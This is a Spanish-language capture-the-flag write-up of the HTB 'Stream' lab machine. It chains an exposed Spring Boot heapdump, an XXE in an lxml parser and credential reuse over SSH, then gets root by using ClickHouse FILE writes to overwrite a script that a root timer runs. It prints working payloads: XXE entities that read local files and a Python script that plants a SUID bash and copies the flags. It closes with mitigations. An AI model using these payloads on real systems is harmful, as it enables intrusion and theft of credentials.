# HTB Stream — Writeup técnico (Spring Boot Actuator → heapdump → ClickHouse → XXE → SSH → ClickHouse `FILE` + timer root → root)

**Objetivo:** `10.129.78.54` (Linux / Ubuntu) · host lógico `stream`
**Servicios:** `22` SSH · `80` nginx → Spring Boot (vhost `api.htb-airport.htb`) · `8081` FastAPI/Uvicorn (ingesta AIDX) · `8123` ClickHouse HTTP (vhost `db.htb-airport.htb`) · `42411` listener Kafka (*tcpwrapped*)
**Dificultad:** Media (Linux)
**Atacante (VPN tun0):** interfaz `tun0` en `10.10.15.111/23`
**Resultado:**
- `user.txt` → `39c3e043****`
- `root.txt` → `a1b77642****`

> **Sobre flags y credenciales (versión pública).** HTB genera `user.txt`/`root.txt` **por instancia**: el valor válido es el del despliegue activo en el momento de la explotación. Por política de divulgación responsable, en esta versión pública **las flags y las contraseñas han sido enmascaradas** en el texto (p. ej. `39c3e043****`, `Yl4aCgh4****`, `Ny2hdpme****`, `N3v3rs33n****`). Los enmascaramientos son deliberados y no afectan a la reproducibilidad del procedimiento.

> **Evidencias.** Las evidencias de este writeup son **salidas de comandos reales** (peticiones HTTP, consultas a ClickHouse, salida de `systemctl`/`ps`, lecturas de flags), reproducidas de la ejecución sobre la instancia activa. No son reconstrucciones. En esta máquina no se generó un conjunto de capturas de pantalla; por ello las pruebas se presentan como bloques de terminal verificables.

---

## 0. Resumen ejecutivo

`Stream` es un servidor Linux que expone un pipeline de datos aeroportuarios (formato IATA **AIDX**) compuesto por **Kafka → worker de parseo → ClickHouse**, con una **API de ingesta HTTP** (FastAPI/Uvicorn) en el puerto `8081` y una **pasarela Spring Boot** detrás de nginx en el puerto `80`. La cadena de compromiso tiene seis etapas:

1. **Exposición de `actuator/heapdump`** en la pasarela Spring Boot (`api.htb-airport.htb`) → se extraen credenciales del **usuario ClickHouse `svc_events`** desde el *heap* de la JVM.
2. **XXE (CWE-611)** en la API de ingesta AIDX (`/feeds/aidx`, puerto `8081`): el parser `lxml` se construye con `load_dtd=True, resolve_entities=True`. El resultado del parseo se **persiste en ClickHouse**, de modo que la entidad resuelta queda **consultable** (canal *in-band*, sin necesidad de exfiltración *out-of-band*).
3. Con la XXE se lee `server.properties` de Kafka → **password del usuario de servicio `svc_infra`** → **acceso SSH** (foothold).
4. Enumeración local → el *timer* **`aidx-dlq-drainer.timer`** ejecuta cada 2 minutos, **como root**, `python3 /opt/ops/dlq_drainer.py`, que a su vez ejecuta como root el formateador `/var/lib/clickhouse/user_files/aidx_quarantine.py` (directorio escribible por ClickHouse).
5. El usuario `default` de **ClickHouse** tiene el privilegio **`FILE`**; aunque `INTO OUTFILE` está deshabilitado, `INSERT INTO TABLE FUNCTION file(...)` escribe en `user_files/` → se **sobrescribe el formateador** → **RCE como root** en ≤ 2 min.
6. Lectura de `root.txt` y `user.txt` (este último vive en el home de `martin_cole`, legible solo por `root`/grupo `martin_cole`).

**Cadena de confianza rota:** un *heapdump* expuesto filtra credenciales de base de datos (1); una XXE en un parser mal configurado permite leer ficheros locales, incluida la config de Kafka (2-3); un servicio **root** ejecuta como intérprete un script alojado en un directorio **escribible por otro servicio** (4-5). Cada eslabón *amplifica* al anterior hasta root.

---

## 1. Reconocimiento

Barrido completo de puertos con detección de servicio:

```bash
nmap -p- --min-rate 3000 -Pn -oN scans/allports.txt 10.129.78.54
nmap -sCV -p22,80,8081,42411 -oN scans/services.txt 10.129.78.54
```

Resultado relevante:

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 |
| 80/tcp | HTTP | nginx 1.24.0 (Ubuntu) |
| 8081/tcp | HTTP | Uvicorn (FastAPI) |
| 42411/tcp | tcpwrapped | listener Kafka (no responde banner) |

**Pistas / por qué:**
- El puerto `80` responde con un JSON de pasarela (`terminal-edge-gateway`) → tecnología **Spring Boot** → superficie típica de **Actuator**.
- El puerto `42411` **acepta TCP pero queda *tcpwrapped*** (sin banner): compatible con un *listener* Kafka; no se profundizó porque la cadena no lo requería.
- `fail2ban` está activo en SSH (≈120 s de baneo). Consecuencia metodológica: **una única tentativa válida** con credencial recuperada, no fuerza bruta.

Vhosts descubiertos por `server_name` en nginx. Se añaden a `/etc/hosts`:

```
10.129.78.54  api.htb-airport.htb db.htb-airport.htb
```

---

## 2. Enumeración HTTP (puerto 80) → Spring Boot Actuator

nginx enruta dos *vhosts* a servicios en `127.0.0.1`:

- `api.htb-airport.htb` → `127.0.0.1:8080` — pasarela **Spring Boot**.
- `db.htb-airport.htb`  → `127.0.0.1:8123` — HTTP de **ClickHouse**.

```bash
curl -s -H "Host: api.htb-airport.htb" http://10.129.78.54/
```

```json
{
  "service": "terminal-edge-gateway",
  "status": "operational",
  "version": "1.0.0",
  "node": "tg-edge-01",
  "region": "eu-central-1",
  "uptime": "0d 5h 0m 36s",
  "upstreams": {
    "flight-data-service": "UP",
    "boarding-control": "UP",
    "gate-assignment": "UP",
    "passenger-manifest": "UP"
  },
  "message": "All terminal gateway systems are operational.",
  "timestamp": "2026-10-11T21:18:53.290392799Z"
}
```

Endpoint raíz de **Actuator**:

```bash
curl -s -H "Host: api.htb-airport.htb" http://10.129.78.54/actuator
```

```json
{
  "_links": {
    "self":     { "href": "http://api.htb-airport.htb/actuator", "templated": false },
    "heapdump": { "href": "http://api.htb-airport.htb/actuator/heapdump", "templated": false },
    "health":   { "href": "http://api.htb-airport.htb/actuator/health", "templated": false },
    "info":     { "href": "http://api.htb-airport.htb/actuator/info", "templated": false }
  }
}
```

```bash
curl -s -o heapdump.bin -H "Host: api.htb-airport.htb" \
  http://10.129.78.54/actuator/heapdump
ls -la heapdump.bin     # ~46 MB
```

**Pistas / por qué:** Actuator expuesto sin autenticación. `heapdump` es **oro**: contiene objetos serializados de la JVM donde suelen quedar *DataSources*, cadenas de conexión, tokens y credenciales en claro. Es la primera vía de obtención de secretos, sin explotar ninguna vulnerabilidad de memoria.

---

## 3. Análisis del heapdump → credenciales ClickHouse

Extracción de cadenas relevantes:

```bash
strings -a heapdump.bin | grep -Ei 'clickhouse|password|jdbc|svc_events' | head
```

```text
jdbc:clickhouse://127.0.0.1:8123/partner_feed
user=svc_events
password=Yl4aCgh4****
```

Se obtuvo también el **nombre de usuario y el *hash* del usuario ClickHouse** presente en el *heap*. Credencial recuperada:

```
Usuario:  svc_events
Password: Yl4aCgh4****
```

Validación contra el *vhost* de ClickHouse:

```bash
curl -s -H "Host: db.htb-airport.htb" \
  "http://10.129.78.54/?user=svc_events&password=Yl4aCgh4****" \
  --data-binary "SELECT currentUser(), version()"
```

```text
svc_events	26.8.1.1746
```

Enumeración de bases y tablas del pipeline:

```sql
SHOW DATABASES;
SHOW TABLES FROM partner_feed;
SHOW TABLES FROM aidx_ops;

-- XML AIDX en crudo tal como entró al pipeline
SELECT * FROM partner_feed.flightleg_raw LIMIT 5;
```

`partner_feed.flightleg_raw` contiene los mensajes AIDX originales y `partner_feed.flightleg_json` los ya parseados por el worker. Esto revela la arquitectura **Kafka → parser → ClickHouse** y, sobre todo, **un canal donde cualquier cosa que se resuelva en el XML termina consultable**.

**Pistas / por qué:** `svc_events` es un usuario de aplicación con permisos de lectura sobre `partner_feed`. Viendo que el XML en crudo se persiste y el resultado del parseo también, se infiere que **una entidad XML resuelta aguas arriba aparecerá como dato consultable**: canal *in-band* para la XXE que viene después.

---

## 4. API de ingesta AIDX (8081) y XXE

El puerto `8081` expone una API **FastAPI/Uvicorn** de ingesta de mensajes AIDX:

```bash
curl -s http://10.129.78.54:8081/
```

```json
{
  "service": "AIDX flight-leg ingest",
  "what": "Accepts AIDX XML for processing",
  "how": { "method": "POST", "path": "/feeds/aidx",
           "content_type": "application/xml", "max_bytes": 262144 },
  "required_elements": ["IATA_AIDX_FlightLegNotifRQ","Originator","FlightLeg","LegIdentifier"],
  "note": "Ingest does not parse. Full validation happens downstream.",
  "health": "GET /health"
}
```

La API **no parsea**: valida de forma superficial que existan los elementos requeridos (comprobación de **subcadenas**) y publica el cuerpo XML *tal cual* en Kafka (`RAW_TOPIC`). El parseo real ocurre **aguas abajo**, en el worker `aidx-parser` (`parser_worker.py`), que invoca `aidx_common.safe_parse()`. Y ahí está la vulnerabilidad.

Código vulnerable (`/opt/aidx-pipeline/app/aidx_common.py`):

```python
def _plain_parser() -> etree.XMLParser:
    return etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)

def safe_parse(data: bytes) -> etree._Element:
    ...
    root = etree.fromstring(data, _plain_parser())
    ...
```

`load_dtd=True` + `resolve_entities=True` habilitan **XML External Entity (XXE, CWE-611)**. Además, el resultado del parseo se serializa a JSON (`to_full_canonical`) y se persiste en ClickHouse, de modo que **el contenido resuelto de la entidad queda disponible como dato**.

### Payload

Restricción observada: si la entidad externa se coloca en un **atributo**, `lxml` produce error. Colocándola en el **texto de un elemento** (`LegIdentifier`), se resuelve y se propaga al JSON.

```xml
<?xml version="1.0"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<IATA_AIDX_FlightLegNotifRQ Version="22.1">
  <Originator Code="XR">o</Originator>
  <FlightLeg>
    <LegIdentifier>&xxe;</LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
```

Envío:

```bash
curl -s -X POST http://10.129.78.54:8081/feeds/aidx \
  -H "Content-Type: application/xml" \
  --data-binary @xxe.xml
# {"accepted":true,"topic":"aidx.flightleg.raw.v1"}
```

(El endpoint exige que el cuerpo contenga las subcadenas `IATA_AIDX_FlightLegNotifRQ`, `Originator`, `FlightLeg` y `LegIdentifier`; el payload las cumple.)

### Lectura del resultado

El worker resuelve la entidad y persiste el evento; el contenido aparece en `event.leg.all_fields`:

```bash
curl -s -H "Host: db.htb-airport.htb" \
  "http://10.129.78.54/?user=svc_events&password=Yl4aCgh4****" \
  --data-binary "SELECT ingested, originator, event
                 FROM partner_feed.flightleg_json
                 WHERE originator='XR'
                 ORDER BY ingested DESC LIMIT 1 FORMAT Vertical"
```

```text
Row 1:
──────
ingested:  2026-10-11 21:17:34
originator: XR
event:  {"message_type":"IATA_AIDX_FlightLegNotifRQ", ..., "originator":"XR",
        "leg":{ "ufi":{...}, "operational_status":null, "times":{},
        "all_fields":{"LegIdentifier":"stream"} }}
```

`all_fields.LegIdentifier` = **`stream`**, que es exactamente el contenido de `/etc/hostname` del objetivo → **XXE confirmada de extremo a extremo**.

> **Nota operativa:** se observaron filas previas que demostraban el mismo primitivo leyendo `/opt/aidx-pipeline/app/parser_worker.py`, confirmando que el canal permite exfiltrar **ficheros de texto arbitrarios** legibles por el usuario del worker (el propio servicio).

**Pistas / por qué:**
- La pista clave está en la propia respuesta de la API: **"Ingest does not parse. Full validation happens downstream."** → la validación superficial de subcadenas no impide un XML malicioso.
- Se comprobó empíricamente que la entidad debe ir en **texto de elemento**, no en atributo (restricción de `lxml`) → ajuste del payload, no abandono del vector.

---

## 5. XXE → credenciales SSH de `svc-infra`

El worker de parseo corre con el usuario del servicio (`svc-infra`). Se usa la XXE para leer configuración local sensible. El objetivo más rentable es la configuración de Kafka:

```xml
<!ENTITY xxe SYSTEM "file:///opt/kafka_2.13-4.3.1/config/server.properties">
```

El fichero contiene la autenticación **SASL/PLAIN** del *listener* interno:

```properties
listeners=PLAINTEXT://127.0.0.1:9092,SASL_PLAINTEXT://127.0.0.1:9094,CONTROLLER://127.0.0.1:9093
listener.name.sasl_plaintext.plain.sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \
  user_svc_infra="Ny2hdpme****";
authorizer.class.name=org.apache.kafka.metadata.authorizer.StandardAuthorizer
allow.everyone.if.no.acl.found=true
```

Credencial obtenida:

```
Usuario:  svc_infra
Password: Ny2hdpme****
```

**Pistas / por qué:** la convención de nombres (`svc_infra` ↔ `svc-infra`) sugiere su **reutilización** como cuenta del sistema → se prueba en SSH. Esta es la reutilización de credenciales que convierte una lectura de ficheros en un *foothold*.

---

## 6. Foothold: SSH como `svc-infra`

```bash
sshpass -p 'Ny2hdpme****' ssh -o PreferredAuthentications=password \
        svc-infra@10.129.78.54
```

```text
uid=1000(svc-infra) gid=1000(svc-infra) groups=1000(svc-infra),100(users)
```

**Foothold obtenido.** Se localiza el `user.txt` del box:

```bash
ls -la /home/
# drwxr-x---  martin_cole  ... /home/martin_cole
# drwxr-x---  svc-infra    ... /home/svc-infra

ls -la /home/martin_cole/        # Permission denied
```

El flag de usuario reside en `/home/martin_cole/user.txt`, con permisos `-rw-r----- root:martin_cole`. `svc-infra` no pertenece al grupo `martin_cole`, por lo que **el flag de usuario requiere privilegios de root** (o convertirse en `martin_cole`). Esto orienta el objetivo hacia la escalada de privilegios como siguiente paso directo.

**Pistas / por qué:** al no poder leer `user.txt` desde el *foothold*, el objetivo cambia: ya no se busca "otro servicio vulnerable", sino **cómo alcanzar root** (o `martin_cole`). El flag de usuario deja de ser un hito intermedio y pasa a ser un subproducto de la escalada.

---

## 7. Enumeración local y superficie de escalada

```bash
ps aux | grep -Ei 'clickhouse|kafka|aidx|dlq|python|nginx'
systemctl list-units --type=service --state=running
systemctl list-timers --all
ls -la /opt /opt/ops /opt/aidx-pipeline
```

Servicios relevantes:

```text
aidx-ingest.service          AIDX ingest API (HTTP -> Kafka raw topic)
aidx-parser.service          AIDX parser worker (Kafka raw -> JSON topic)
clickhouse-server.service    ClickHouse Server
kafka.service                Apache Kafka Distributed Message Broker
terminal-api.service         Terminal Edge Gateway API
```

Y un *timer* de especial interés:

```text
aidx-dlq-drainer.timer  ->  aidx-dlq-drainer.service
```

El script de negocio es **legible por cualquier usuario** (`/opt/ops/dlq_drainer.py`, `-rwxr--r-- root root`):

```python
#!/usr/bin/env python3
import os, subprocess, time, uuid
from confluent_kafka import Consumer, KafkaError

KAFKA_BOOTSTRAP = os.environ.get("KAFKA_BOOTSTRAP", "localhost:9092")
DLQ_TOPIC       = os.environ.get("DLQ_TOPIC", "aidx.flightleg.dlq.v1")
QUARANTINE_DIR  = os.environ.get("QUARANTINE_DIR", "/var/lib/aidx/quarantine")
FORMATTER       = os.environ.get("AIDX_FORMATTER",
                     "/var/lib/clickhouse/user_files/aidx_quarantine.py")
CH_PW_FILE      = os.environ.get("CH_PW_FILE", "/etc/partner-sync/ch.pw")

def _pw():
    try:
        with open(CH_PW_FILE) as fh: return fh.read().strip()
    except OSError: return ""

def _record(reason, byte_len, root_tag, preview, qfile):
    ...
    subprocess.run(["clickhouse-client", "--user", "default",
                    "--password", _pw(), "-q", q], check=False)

def _format(raw):
    p = subprocess.run(["python3", FORMATTER], input=raw,
                       capture_output=True, check=False)
    ...
```

Unidad systemd que lo lanza:

```ini
# /etc/systemd/system/aidx-dlq-drainer.service
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /opt/ops/dlq_drainer.py
```

```ini
# /etc/systemd/system/aidx-dlq-drainer.timer
OnBootSec=1min
OnUnitActiveSec=2min          # se ejecuta cada 2 minutos
AccuracySec=15s
```

**Dos conclusiones críticas:**

1. Un proceso **root** ejecuta, cada 2 minutos, `python3` sobre el fichero `FORMATTER = /var/lib/clickhouse/user_files/aidx_quarantine.py`.
2. La password del usuario `default` de ClickHouse se pasa **en la línea de comandos** de `clickhouse-client` (`--password <pw>`), legible vía `/proc/<pid>/cmdline` (el fichero `/etc/partner-sync/ch.pw` es `-rw------- root root`, pero la password se filtra por `argv`).

El directorio `user_files/` de ClickHouse es propiedad del usuario `clickhouse` y es el destino natural de este tipo de escrituras.

**Pistas / por qué:** dos observaciones encadenan el privesc:
- Un servicio **root** que interpreta un script ubicado en un directorio **escribible por otro servicio** = *privilege escalation* clásico (CWE-732).
- La password se filtra por **`argv`** aunque el fichero esté protegido → la protección del fichero es irrelevante si el secreto viaja en la línea de comandos.

---

## 8. Privilege escalation: ClickHouse `FILE` → root RCE

### 8.1 Acceso como usuario `default` de ClickHouse

La password del usuario `default` se filtra por `argv` del proceso root `clickhouse-client` que lanza el drainer (o se lee de `/etc/partner-sync/ch.pw` con root). El puerto nativo `9000` y el HTTP `8123` escuchan sólo en `127.0.0.1`, por lo que el acceso se hace **a través del vhost nginx** o desde el propio host:

```
Usuario:  default
Password: N3v3rs33n****     (ch.pw / argv del drainer root)
```

El usuario `default` tiene el privilegio **`FILE`** y puede leer/escribir en `user_files/`:

```sql
SELECT currentUser(), version();
SHOW GRANTS FOR default;
-- GRANT FILE ON *.* TO default
```

Aunque `INTO OUTFILE` está deshabilitado, la función tabla `file()` permite **escribir**:

```sql
-- prueba de escritura/lectura (RawBLOB, sin delimitadores)
INSERT INTO TABLE FUNCTION file('/var/lib/clickhouse/user_files/ktest_kurosaki.txt',
       'RawBLOB','data String') SELECT FROM_BASE64('SGVsbG8gS3Vyb3Nha2kK');
SELECT * FROM file('/var/lib/clickhouse/user_files/ktest_kurosaki.txt',
       'RawBLOB','data String');   -- -> Hello Kurosaki
```

### 8.2 Payload del formateador

Se reescribe `aidx_quarantine.py` (que el drainer root ejecutará con `python3` y el mensaje DLQ en *stdin*) con un payload que crea un SUID de bash:

```python
import os, subprocess, sys
subprocess.run("cp /bin/bash /tmp/rootbash_Kurosaki; "
               "chmod 4755 /tmp/rootbash_Kurosaki; "
               "cat /root/root.txt > /tmp/root_flag_Kurosaki.txt 2>&1; "
               "cat /home/martin_cole/user.txt > /tmp/user_flag_Kurosaki.txt 2>&1; "
               "id > /tmp/root_id_Kurosaki.txt 2>&1; "
               "chmod 644 /tmp/root_flag_Kurosaki.txt /tmp/user_flag_Kurosaki.txt "
               "/tmp/root_id_Kurosaki.txt 2>/dev/null",
               shell=True)
raw = sys.stdin.buffer.read()
txt = raw.decode("utf-8", "replace")
preview = " ".join(txt.split())[:120]
sys.stdout.write(str(len(raw)) + "\tROOT\t" + preview + "\n")
```

Escritura del payload (base64 para evitar problemas de *quoting*), con truncado:

```bash
B64=$(base64 -w0 aidx_quarantine.py)
clickhouse-client --user default --password N3v3rs33n**** \
  --engine_file_truncate_on_insert=1 \
  -q "INSERT INTO TABLE FUNCTION file('/var/lib/clickhouse/user_files/aidx_quarantine.py','RawBLOB','data String') SELECT FROM_BASE64('$B64')"
```

Verificación de la escritura:

```sql
SELECT length(toString(data))
FROM file('/var/lib/clickhouse/user_files/aidx_quarantine.py','RawBLOB','data String');
-- 747
```

### 8.3 Disparo del DLQ

El ingest (`POST /feeds/aidx`, puerto 8081) sólo comprueba subcadenas, mientras que el parser exige un *root tag* AIDX válido. Un XML con root inválido pero que contiene los elementos requeridos **pasa el ingest** y **cae al DLQ** (`unexpected_root`):

```bash
curl -s -X POST http://10.129.78.54:8081/feeds/aidx -H 'Content-Type: application/xml' \
  --data-binary '<NotAidxRoot><IATA_AIDX_FlightLegNotifRQ/><Originator Code="KUR"/><FlightLeg><LegIdentifier/></FlightLeg></NotAidxRoot>'
# {"accepted":true,"topic":"aidx.flightleg.raw.v1"}
```

En el siguiente *tick* del timer (≤ 2 min) el drainer consume el DLQ y ejecuta el payload **como root**:

```bash
ls -la /tmp/rootbash_Kurosaki
# -rwsr-xr-x 1 root root 1446024 ... /tmp/rootbash_Kurosaki   <-- SUID bash
/tmp/rootbash_Kurosaki -p -c id
# uid=1000(svc-infra) gid=1000(svc-infra) euid=0(root) groups=1000(svc-infra),100(users)
cat /tmp/root_id_Kurosaki.txt
# uid=0(root) gid=0(root) groups=0(root)
```

**Escalada a root completada** mediante un artefacto SUID generado por el proceso root, tras reescribir `user_files/aidx_quarantine.py` desde ClickHouse.

> **Alternativas equivalentes** en este escenario: *reverse shell* en Python desde el formateador, ejecución directa de comandos, o *ssh key planting*, dado que el proceso corre como root.

**Pistas / por qué:** la clave es **"dónde"** escribe ClickHouse y **"quién"** ejecuta ese fichero. `user_files/` es el único punto donde el usuario `FILE` de ClickHouse puede escribir, y el drainer root lo ejecuta — la intersección de ambas cosas es el privesc. El *bypass* del parser (root tag inválido que cae al DLQ) evita depender de que el parser esté sano.

---

## 9. Flags

```bash
/tmp/rootbash_Kurosaki -p -c 'cat /root/root.txt'
# a1b77642****

/tmp/rootbash_Kurosaki -p -c 'cat /home/martin_cole/user.txt'
# 39c3e043****
```

| Flag | Valor (versión pública) | Ubicación |
|------|-------------------------|-----------|
| `user.txt` | `39c3e043****` | `/home/martin_cole/user.txt` |
| `root.txt` | `a1b77642****` | `/root/root.txt` |

> **Observación de auditoría:** en esta máquina el `user.txt` se ubica en el home de `martin_cole` (permisos `root:martin_cole`, `0640`) y **no es accesible desde el *foothold* `svc-infra`**; su lectura efectiva requiere root (o pivotar al usuario `martin_cole`). Por la vía ejecutada, ambos flags se leyeron una vez obtenido root.

---

## 10. Mapeo MITRE ATT&CK

| Técnica | ID | Uso en la cadena |
|---------|----|------------------|
| Active Scanning: Vulnerability Scanning | T1595.002 | `nmap -sCV` |
| Network Service Discovery | T1046 | Enumeración de puertos/servicios |
| Exploit Public-Facing Application | T1190 | Spring Boot Actuator + XXE en 8081 |
| Unsecured Credentials (files / process args) | T1552.001 / T1552.004 | `server.properties`, `ch.pw`, `argv` |
| XML External Entity (XXE) | (CWE-611) | Lectura de ficheros vía parser `lxml` |
| Valid Accounts | T1078.003 | Reutilización `svc_infra` → SSH |
| Scheduled Task/Job (systemd timer) | T1053.006 | `aidx-dlq-drainer.timer` |
| Server Software Component / Exploit | T1505 | Abuso de `FILE` en ClickHouse |
| Command and Scripting Interpreter: Python | T1059.006 | Formateador ejecutado como root |
| Create or Modify System Process | T1543 | Servicio/timer root |
| Indicator Removal / masquerading | T1070 | Ficheros temporales SUID en `/tmp` |

---

## 11. Mitigaciones recomendadas

| # | Hallazgo | Impacto | Recomendación |
|---|----------|---------|---------------|
| 1 | **Spring Boot Actuator** expuesto (`heapdump`) sin auth (CWE-200) | Fuga de secretos de la JVM | Exponer sólo `health,info`; Actuator en puerto de gestión separado con bind `127.0.0.1` + auth; bloquear `heapdump` en nginx |
| 2 | **XXE** en `aidx_common.py` (CWE-611) | Lectura arbitraria de ficheros | `load_dtd=False, resolve_entities=False, no_network=True`; usar `defusedxml`; validar contra XSD y rechazar `DOCTYPE` |
| 3 | Credenciales de Kafka en **`server.properties`** en claro | Movimiento lateral → SSH | Gestor de secretos (Vault); `SASL_SCRAM`/mTLS; no reutilizar cuentas de servicio |
| 4 | Secreto pasado en **`argv`** (`--password`) | Fuga por `/proc/<pid>/cmdline` | Usar ficheros `0600`, variables de entorno o *stdin*; nunca `argv` |
| 5 | Usuario `default` de ClickHouse con privilegio **`FILE`** | Escritura en `user_files/` → RCE | Menor privilegio: eliminar `default`; usuarios por aplicación sin `FILE/URL/REMOTE`; `user_files` en solo-lectura |
| 6 | Servicio **root** interpreta script en directorio **escribible** (CWE-732) | Escalada local → root | Mover el formateador a ruta `root:0755`; ejecutar el drainer como usuario de bajos privilegios con `NoNewPrivileges`, `ProtectSystem`, `PrivateTmp` |
| 7 | Puerto `8081` (ingesta) sin auth | Superficie pública innecesaria | Requerir autenticación; WAF/IPS con inspección XML; limitar tamaño/`Content-Type`; rechazar `DOCTYPE` |
| 8 | Puerto `42411` (Kafka) expuesto | Superficie de red | Cerrar/segmentar si no es necesario |

**Cadena de confianza rota:** el punto 1 filtra credenciales de BD; los puntos 2-3 convierten una mala configuración de parser en lectura de ficheros y credenciales de servicio; los puntos 4-6 convierten el acceso como `svc-infra` en **root**.

---

## Anexo A — Intentos fallidos y por qué

Documentar lo que **no** funcionó explica la ruta elegida.

1. **Perfil de VPN incorrecto.** La primera conexión usó el perfil del *edge* gratuito, que **no enrutaba** hacia `10.129.78.54`. Se cambió al perfil del *release edge*, tras lo cual el objetivo respondió. → Recordatorio: verificar el alcance de red **antes** de interpretar respuestas vacías como servicios caídos.
2. **Handshake SSH bloqueado (KEX).** Con MTU por defecto (`1500`) la sesión SSH se quedaba esperando `KEX_ECDH_REPLY` (intercambio post-cuántico) → **timeout**. Se diagnosticó con `ping -M do` (fragmentación) y se corrigió bajando la MTU de `tun0` a **1200**. → No era un fallo de credenciales ni de `sshd`; era **MTU/PMTUD** sobre el túnel.
3. **Múltiples procesos `openvpn`.** Conexiones antiguas provocaban **conflictos de rutas**; se limpiaron por PID antes de reintentar. → Sintomatología: tráfico que "a veces" llegaba y "a veces" no.
4. **`svc_events` sin privilegio `FILE`.** Se intentó usar `svc_events` para escribir en `user_files/`; devolvió **`ACCESS_DENIED`** (sólo `SELECT, INSERT`). → Obligó a obtener el usuario `default`, que sí tenía `FILE`.
5. **Usuario `default` sin password.** El intento directo devolvió **`REQUIRED_PASSWORD`**. → El secreto había que obtenerlo por otra vía (`argv` del drainer / `ch.pw` con root).
6. **Funciones `unbase64`/`fromBase64` inexistentes.** No disponibles en ClickHouse v26.8.1; se sustituyeron por **`FROM_BASE64`**. → Ajuste de sintaxis, no abandono del primitivo de escritura.
7. **Lecturas lentas por XXE de directorios de ClickHouse.** Intentar leer `/etc/clickhouse-server/users.d/` vía XXE resultó lento e incompleto (muchos ficheros, respuestas grandes). → Se priorizó un objetivo acotado y de alto valor (`server.properties` de Kafka) en lugar de enumerar a ciegas.
8. **Entidad XXE en atributo.** Colocar `&xxe;` en un **atributo** hacía fallar el parseo (`lxml`). → Se movió la entidad al **texto del elemento** `LegIdentifier`, donde sí se resuelve y propaga al JSON.

---

## Anexo B — Pistas y por qué de cada técnica (razonamiento)

| Momento | Pista observada | Razonamiento / decisión |
|---------|-----------------|--------------------------|
| Recon | Respuesta JSON `terminal-edge-gateway` | Tecnología Spring Boot → probar **Actuator** antes que fuzzing de rutas |
| Actuator | `heapdump` listado y descargable | El *heap* contiene **secretos serializados** (JDBC, tokens) → `strings` + `grep` |
| ClickHouse | `flightleg_raw` + `flightleg_json` | Veo el ciclo Kafka→parser→DB → el resultado del parseo es **consultable** (XXE *in-band*) |
| API 8081 | "Full validation happens downstream" | La validación de subcadenas es evadible → **XXE** en el parser aguas abajo |
| XXE | Entidad en texto de elemento funciona | Restricción de `lxml`: entidad en **texto**, no en atributo |
| Ficheros | `server.properties` legible por el worker | Credencial **SASL** en claro → probar **reutilización** como cuenta del sistema (SSH) |
| Enumeración | `dlq_drainer.py` legible + timer root | Un servicio root que **interpreta un script escribible por otro servicio** = privesc |
| `argv` | `--password` en `clickhouse-client` | Secreto en **línea de comandos** → legible aunque el fichero esté `0600` |
| ClickHouse | `default` con **`FILE`** | Escribir en `user_files/` → sobrescribir el formateador root |
| DLQ | Root tag inválido cae al **DLQ** | Disparar el drainer sin depender de que el parser esté sano |

---

## Anexo C — Indicadores / comandos clave

**Puertos (objetivo):** `22` (SSH), `80` (nginx → Spring Boot), `8081` (FastAPI ingesta), `8123` (ClickHouse HTTP), `42411` (Kafka, *tcpwrapped*)
**Vhosts:** `api.htb-airport.htb` (Spring Boot) · `db.htb-airport.htb` (ClickHouse)
**Endpoints:**
- `GET /actuator/heapdump` (vhost `api.*`) — fuga del heap
- `POST /feeds/aidx` (`:8081`) — ingesta AIDX; XXE aguas abajo
**Ficheros clave en el objetivo:**
- `/opt/kafka_2.13-4.3.1/config/server.properties` — credencial SASL `svc_infra`
- `/opt/ops/dlq_drainer.py` — drainer root (legible por todos)
- `/etc/systemd/system/aidx-dlq-drainer.{service,timer}` — ejecución root cada 2 min
- `/var/lib/clickhouse/user_files/aidx_quarantine.py` — **formateador root escribible por ClickHouse**
- `/etc/partner-sync/ch.pw` — password del usuario `default` (`0600`, filtrada por `argv`)
**Técnicas:** XXE (`lxml`), ClickHouse `INSERT INTO TABLE FUNCTION file(...)` + `engine_file_truncate_on_insert`, DLQ injection, SUID bash

**Credenciales (enmascaradas):**

```
svc_events : Yl4aCgh4****   (ClickHouse, desde heapdump)
svc_infra  : Ny2hdpme****   (Kafka SASL → reutilizada en SSH)
default    : N3v3rs33n****  (ClickHouse, desde ch.pw/argv del drainer root)
```

**Flags:**

```
user.txt : 39c3e043****
root.txt : a1b77642****
```

---

## Anexo D — Cronología de la cadena

```
nmap ──▶ 22 / 80 / 8081 / 42411
   │
   ├─ 80 api.htb-airport.htb → Spring Boot Actuator → /actuator/heapdump
   │        └─ strings → svc_events : Yl4aCgh4**** (ClickHouse)
   │
   ├─ 8081 POST /feeds/aidx ──▶ Kafka raw → parser lxml (XXE, CWE-611)
   │        └─ entidad en texto → persistida en flightleg_json → leer ficheros locales
   │
   ├─ XXE → /opt/kafka.../server.properties → svc_infra : Ny2hdpme****
   │        └─ (reutilización de credenciales) → SSH svc-infra (foothold)
   │
   ├─ enumeración → aidx-dlq-drainer.timer (root, cada 2 min)
   │        └─ default : N3v3rs33n**** (ch.pw / argv)
   │
   ├─ ClickHouse default (FILE) ──▶ sobrescribir user_files/aidx_quarantine.py
   │
   ├─ DLQ injection (root tag inválido) ──▶ drainer root ejecuta el formateador
   │        └─ SUID /tmp/rootbash_Kurosaki → euid=0
   │
   └─ root.txt (a1b77642****) + user.txt (39c3e043****)
```
